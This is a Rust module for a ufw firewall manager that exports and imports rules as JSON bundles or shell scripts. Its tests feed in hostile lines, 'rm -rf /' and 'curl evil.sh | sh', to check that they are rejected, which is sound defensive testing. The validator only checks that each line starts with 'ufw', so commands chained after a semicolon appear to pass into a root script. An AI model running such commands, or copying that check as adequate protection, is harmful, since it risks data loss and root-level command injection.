use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use crate::model::ServerProfile;
use crate::ufw::{Defaults, FirewallState};

pub const BUNDLE_FORMAT: &str = "ufw-manager-export";
pub const BUNDLE_VERSION: u32 = 1;

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct FirewallDump {
    pub active: bool,
    pub logging: String,
    pub defaults: Defaults,
    pub added_commands: Vec<String>,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Bundle {
    pub format: String,
    pub version: u32,
    #[serde(default)]
    pub exported_at_unix: u64,
    pub firewall: FirewallDump,
    #[serde(default)]
    pub servers: Option<Vec<ServerProfile>>,
}

pub fn servers_path() -> Option<PathBuf> {
    dirs::config_dir().map(|d| d.join("ufw-manager").join("servers.json"))
}

pub fn load_servers() -> Vec<ServerProfile> {
    let Some(path) = servers_path() else {
        return Vec::new();
    };
    let Ok(text) = std::fs::read_to_string(path) else {
        return Vec::new();
    };
    serde_json::from_str::<Vec<ServerProfile>>(&text).unwrap_or_default()
}

pub fn save_servers(servers: &[ServerProfile]) -> Result<(), String> {
    let Some(path) = servers_path() else {
        return Err("Could not determine config directory".into());
    };
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
    }
    let text = serde_json::to_string_pretty(servers).map_err(|e| e.to_string())?;
    std::fs::write(&path, text).map_err(|e| e.to_string())
}

pub fn build_json_bundle(
    fw: &FirewallState,
    servers: Option<&[ServerProfile]>,
) -> Result<String, String> {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let bundle = Bundle {
        format: BUNDLE_FORMAT.into(),
        version: BUNDLE_VERSION,
        exported_at_unix: now,
        firewall: FirewallDump {
            active: fw.active,
            logging: fw.logging.clone(),
            defaults: fw.defaults.clone(),
            added_commands: fw.added_commands.clone(),
        },
        servers: servers.map(|s| s.to_vec()),
    };
    serde_json::to_string_pretty(&bundle).map_err(|e| e.to_string())
}

pub fn build_script(fw: &FirewallState) -> String {
    let mut out = String::new();
    out.push_str("#!/bin/sh\n");
    out.push_str("# Exported by ufw-manager\n");
    out.push_str("# Run as root: sh this-file\n\n");
    out.push_str(&format!(
        "ufw default {} incoming\n",
        fw.defaults.incoming.as_str()
    ));
    out.push_str(&format!(
        "ufw default {} outgoing\n",
        fw.defaults.outgoing.as_str()
    ));
    out.push_str(&format!(
        "ufw default {} routed\n",
        fw.defaults.routed.as_str()
    ));
    out.push_str(&format!("ufw logging {}\n", fw.logging));
    out.push_str("\n# Rules (ufw show added)\n");
    for cmd in &fw.added_commands {
        out.push_str(cmd);
        out.push('\n');
    }
    out.push('\n');
    if fw.active {
        out.push_str("ufw --force enable\n");
    } else {
        out.push_str("ufw disable\n");
    }
    out
}

/// The result of parsing an import file, before it becomes shell commands.
#[derive(Clone, Debug, Default)]
pub struct ImportPlan {
    /// ufw commands, each validated to start with `ufw`.
    pub commands: Vec<String>,
    /// Settings from a JSON bundle (absent for plain scripts).
    pub defaults: Option<Defaults>,
    pub logging: Option<String>,
    pub active: Option<bool>,
    /// Saved servers from a JSON bundle.
    pub servers: Vec<ServerProfile>,
    pub from_json: bool,
}

fn is_ufw_command(s: &str) -> bool {
    s == "ufw" || s.starts_with("ufw ") || s.starts_with("ufw\t")
}

pub fn parse_import(content: &str) -> Result<ImportPlan, String> {
    let trimmed = content.trim_start();
    if trimmed.starts_with('{') {
        parse_json_import(content)
    } else {
        parse_script_import(content)
    }
}

fn parse_json_import(content: &str) -> Result<ImportPlan, String> {
    let bundle: Bundle = serde_json::from_str(content).map_err(|e| format!("Invalid JSON: {e}"))?;
    if bundle.format != BUNDLE_FORMAT {
        return Err(format!(
            "Not a ufw-manager export (format field is {:?})",
            bundle.format
        ));
    }
    let mut commands = Vec::new();
    for cmd in &bundle.firewall.added_commands {
        let cmd = cmd.trim();
        if !is_ufw_command(cmd) {
            return Err(format!("Refusing to import non-ufw command: {cmd:?}"));
        }
        commands.push(cmd.to_string());
    }
    Ok(ImportPlan {
        commands,
        defaults: Some(bundle.firewall.defaults),
        logging: Some(bundle.firewall.logging),
        active: Some(bundle.firewall.active),
        servers: bundle.servers.unwrap_or_default(),
        from_json: true,
    })
}

fn script_state(line: &str) -> Option<bool> {
    match line {
        "ufw enable" | "ufw --force enable" => Some(true),
        "ufw disable" | "ufw --force disable" => Some(false),
        _ => None,
    }
}

fn parse_script_import(content: &str) -> Result<ImportPlan, String> {
    let mut commands = Vec::new();
    let mut active = None;
    for (i, raw) in content.lines().enumerate() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with("#!") {
            continue;
        }
        let line = line.strip_prefix("sudo ").unwrap_or(line).trim();
        if !is_ufw_command(line) {
            return Err(format!(
                "Line {}: only ufw commands are accepted, got {:?}",
                i + 1,
                line
            ));
        }
        if let Some(state) = script_state(line) {
            active = Some(state);
            continue;
        }
        commands.push(line.to_string());
    }
    if commands.is_empty() {
        return Err("No ufw commands found in file".into());
    }
    Ok(ImportPlan {
        commands,
        active,
        ..Default::default()
    })
}

fn sh_join(commands: &[String]) -> String {
    commands.join("\n")
}

/// Turn an import plan into a single shell script.
///
/// * `replace` — run `ufw --force reset` first (destructive), then restore
///   the enabled state recorded in the file (or `current_active` if the file
///   doesn't say).
/// * merge — only applies settings and rules; never changes enabled state.
pub fn plan_to_script(plan: &ImportPlan, replace: bool, current_active: bool) -> String {
    let mut lines: Vec<String> = Vec::new();
    lines.push("set -e".into());
    if replace {
        lines.push("ufw --force reset".into());
    }
    if let Some(d) = &plan.defaults {
        lines.push(format!("ufw default {} incoming", d.incoming.as_str()));
        lines.push(format!("ufw default {} outgoing", d.outgoing.as_str()));
        lines.push(format!("ufw default {} routed", d.routed.as_str()));
    }
    if let Some(l) = &plan.logging {
        lines.push(format!("ufw logging {l}"));
    }
    lines.push(sh_join(&plan.commands));

    if replace && plan.active.unwrap_or(current_active) {
        lines.push("ufw --force enable".into());
    }
    lines.join("\n") + "\n"
}

pub fn read_file(path: &Path) -> Result<String, String> {
    std::fs::read_to_string(path).map_err(|e| format!("Could not read {}: {e}", path.display()))
}

pub fn write_file(path: &Path, content: &str) -> Result<(), String> {
    std::fs::write(path, content).map_err(|e| format!("Could not write {}: {e}", path.display()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::Policy;
    use crate::ufw::FirewallState;

    fn sample_fw() -> FirewallState {
        FirewallState {
            loaded: true,
            active: true,
            logging: "low".into(),
            defaults: Defaults {
                incoming: Policy::Deny,
                outgoing: Policy::Allow,
                routed: Policy::Disabled,
            },
            rules: Vec::new(),
            added_commands: vec!["ufw allow 22/tcp".into(), "ufw deny from 10.0.0.0/8".into()],
            apps: Vec::new(),
            raw_verbose: String::new(),
        }
    }

    #[test]
    fn json_roundtrip() {
        let fw = sample_fw();
        let json = build_json_bundle(&fw, None).unwrap();
        let plan = parse_import(&json).unwrap();
        assert!(plan.from_json);
        assert_eq!(plan.commands, fw.added_commands);
        assert_eq!(plan.active, Some(true));
        assert_eq!(plan.logging.as_deref(), Some("low"));
        assert_eq!(plan.defaults.as_ref().unwrap().incoming, Policy::Deny);
    }

    #[test]
    fn script_roundtrip() {
        let fw = sample_fw();
        let script = build_script(&fw);
        let plan = parse_import(&script).unwrap();
        assert!(!plan.from_json);
        assert_eq!(plan.commands.len(), 6); // 3 defaults + logging + 2 rules
        assert_eq!(plan.active, Some(true));
        assert!(plan.commands.iter().all(|c| c.starts_with("ufw ")));
    }

    #[test]
    fn rejects_arbitrary_shell_in_json() {
        let json = r#"{
            "format": "ufw-manager-export",
            "version": 1,
            "firewall": {
                "active": true,
                "logging": "low",
                "defaults": {"incoming": "deny", "outgoing": "allow", "routed": "disabled"},
                "added_commands": ["rm -rf /"]
            }
        }"#;
        let err = parse_import(json).unwrap_err();
        assert!(err.contains("Refusing"));
    }

    #[test]
    fn rejects_arbitrary_shell_in_script() {
        let err = parse_import("# hi\nufw allow 22\ncurl evil.sh | sh\n").unwrap_err();
        assert!(err.contains("Line 3"));
    }

    #[test]
    fn script_import_accepts_sudo_prefix() {
        let plan = parse_import("sudo ufw allow 80/tcp\n").unwrap();
        assert_eq!(plan.commands, vec!["ufw allow 80/tcp"]);
    }

    #[test]
    fn replace_plan_enables_when_active() {
        let fw = sample_fw();
        let json = build_json_bundle(&fw, None).unwrap();
        let plan = parse_import(&json).unwrap();
        let script = plan_to_script(&plan, true, false);
        assert!(script.contains("ufw --force reset"));
        assert!(script.contains("ufw --force enable"));
        assert!(script.contains("set -e"));
    }

    #[test]
    fn merge_plan_does_not_touch_state() {
        let fw = sample_fw();
        let json = build_json_bundle(&fw, None).unwrap();
        let plan = parse_import(&json).unwrap();
        let script = plan_to_script(&plan, false, true);
        assert!(!script.contains("reset"));
        assert!(!script.contains("enable"));
        assert!(script.contains("ufw allow 22/tcp"));
    }

    #[test]
    fn replace_of_script_keeps_current_state() {
        let plan = parse_import("ufw allow 22/tcp\n").unwrap();
        let script = plan_to_script(&plan, true, true);
        assert!(script.contains("ufw --force reset"));
        assert!(script.contains("ufw --force enable"));
        let script = plan_to_script(&plan, true, false);
        assert!(!script.contains("ufw --force enable"));
    }
}
